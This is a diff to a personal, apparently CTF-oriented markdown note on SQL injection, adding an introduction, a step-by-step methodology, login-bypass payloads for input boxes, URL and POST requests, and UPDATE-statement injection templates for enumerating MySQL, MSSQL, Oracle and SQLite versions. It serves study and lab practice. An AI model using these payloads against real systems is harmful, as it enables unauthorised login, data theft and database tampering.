@@ -1,7 +1,17 @@
 # SQLInjection
 
+## Introduction
+
+SQL injection is a technique used by attacked to execute malicious SQL statements with objective of stealing information, modifying the database or command execution from the context of database interacting with other networked components. Application commonly require dynamic SQL queries to display content conditionally by user context. Users are then granted some part in the process of displaying that content. This input without input sanitization the attacker can make the database interpret the user input as an SQL input instead of data. With parameter control attack can inject malicious query, which may be executed by the database. For introductory material about SQL see [[Introduction-to-SQL]], if you just here for [[SQLmap-CheatSheet]] then follow the latter link.
+
+Invaluable Payload up-to-date pylaod listings can be found:
+[payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list
+[PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+
 An ode to SQLI:
 ```poem
+title: Sleepy-Questions-Language-Idea 'behind attack=attack -- - 
+
 sqlin' da morning 
 sqlin' your evening
 admin or one plus one equals two
@@ -14,15 +24,22 @@ database asleep pleasing
 SELECT star FROM passwords stealing
 by 7ru7h
 ```
-## Useful resources
-[[Introduction-to-SQL]]
-[[SQLmap-CheatSheet]]
 
-https://github.com/payloadbox/sql-injection-payload-list
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
-## Sleepy-Questions-LanguageIdea 'behind attack=attack -- - Methodology
-Indication of vulnerablity: variations with use of  `'` which used a string delimiter. Databases require instructional commands to store, organise and interact with data. Firstly the requirement is to inject maliformed SQL queries to break the query syntax through a logical mechanism and the sql parser's interpretation of characters external usage in token classification. The `-` comment  character is recognised as a break from a functionality to interact with database. Or `'` to indicate the opening of string declaration. The paring functions to consider the following set of character as string continously until otherwise stated. In break the query access to debug messages or likewise indicated through commanding the server to delay its subsequent response demonstrating control of the server. If it will `sleep` because a malicious query states such for speficied time the query may be transformed to the fix its breakage of syntax to then query actual information on the database. Or use the system hosting the database to use the database as storage for further movement with commands to to remote code excution. 
+## Methodology
+Indication of vulnerablity: 
+- variations with use of  `'` which used a string delimiter. 
+
+Databases require instructional commands to store, organise and interact with data. 
+1. The requirement is to inject maliformed SQL queries to break the query syntax through a logical mechanism and the sql parser's interpretation of characters external usage in token classification.  
+	- The `-` comment  character is recognised as a break from a functionality to interact with database. 
+	- Or `'` to indicate the opening of string declaration. The paring functions to consider the following set of character as string continously until otherwise stated. 
+2. In breaking the query, access to debug messages or likewise indicated through commanding the server to delay its subsequent response demonstrating control of the server. 
+3. If it will `sleep` because a malicious query states such for a specified length of time 
+	- Then query may be transformed to the fix its breakage of syntax to 
+		- Then query actual information on the database. 
+			- [[FFUF-Cheatsheet]] maybe useful in fuzzing fields of the database.
+		- Or use the system hosting the database to use the database as storage for further movement with commands to code excution. 
 
 ## Use cases for SQLi 
 
@@ -67,14 +84,16 @@ MySQL specific for extensive information for see [[MySQL-Cheatsheet]]
 ```
 
 
-## Consider SQL filtering
+## Considering SQL filtering
 
-Blind SQLi
+##### Blind SQLi
 Cause SQL error -> Fix it -> add SQL queries
 Use sleep(5) if reponse is instant SQL query, then there is no SQLi
 
-Union SQLi:
+#### Union SQLi:
 Find number of columns -> Check suitable columns -> Attack
+
+
 
 ## Database type enumeration
 ```sql
@@ -89,9 +108,92 @@ MySQL and MSSQL
 ## Defense and Migitation
 [Prepared Statements prevent 'illegal' queries](https://en.wikipedia.org/wiki/Prepared_statement)
 
+## Typology 
+
+#### Input Boxes 
+
+Input Box Non-String - Parameter expects an integer
+```sql
+1 or 1=1-- -
+```
+
+Input Box String- Parameter expects a string
+```sql
+admin' or '1'='1'-- -
+```
+
+#### URL and POST Injection
+Consider
+```javascript
+// Client side controls
+function validateform() {
+    var profileID = document.inputForm.profileID.value;
+    var password = document.inputForm.password.value;
+
+    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
+        alert("The input fields cannot contain special characters");
+        return false;
+    }
+    if (profileID == null || password == null) {
+        alert("The input fields cannot be empty.");
+        return false;
+    }
+}
+```
+
+URL Injection - URL bar in Browser!
+```html
+<!-- URL shows URL parameters -->
+http://website/login?profileID=a&password=a 
+<!-- Client Validation bypass, by going directly to URL  -->
+http://website/login?profileID=-1' or 1=1-- -&password=a
+<!-- URL encode -->
+http://website/login?profileID=-1%27%20or%201=1--%20-&password=a 
+```
+
+POST Injection - POST request has data 
+```html
+POST /login <!-- POST request -->
+Host: website
+...
+Referer: website
+<!-- Newline goes here, below is the data -->
+profileID=-1' or 1=1-- -&password=a
+```
+
+#### UPDATE statement
+SQLi on UPDATE can modify database **BEWARE**
+```html
+<!-- html form -->
+<input type="text" class="form-control" placeholder "Username" id="username" value="">
+...
+<input type="text" class="form-control" placeholder "Email" id="email" value="">
+...
+<input type="text" class="form-control" placeholder "Password" id="password" value="">
+```
+
+Enumerate with:
+```sql
+-- BEWARE this is a template for the above not a payload
+-- consider what information the database to frontend pipeline displays
+asd',username='test',email='hacked
+-- Enumeration is done to gather information of:
+-- Correct column names; some might not be visuable, if wrong column names it wont update
+-- Then we use these columns to get data back from the database inplace of intend information
+-- MySQL and MSSQL
+',username=@@version,email='
+-- For Oracle
+',username=(SELECT banner FROM v$version),email='
+-- For SQLite
+',username=sqlite_version(),email='
+-- Then use targeted database's SQL variant -> tablename -> target table's fields -> data
+```
+
 
 
 ## References
 [Prepared Statements Wiki](https://en.wikipedia.org/wiki/Prepared_statement)
 [TryHackMe SLQinjections Labs room](https://tryhackme.com/room/sqlilab)
 [Computerphile Video](https://www.youtube.com/watch?v=ciNHn38EyRc)
+[payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list
+[PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
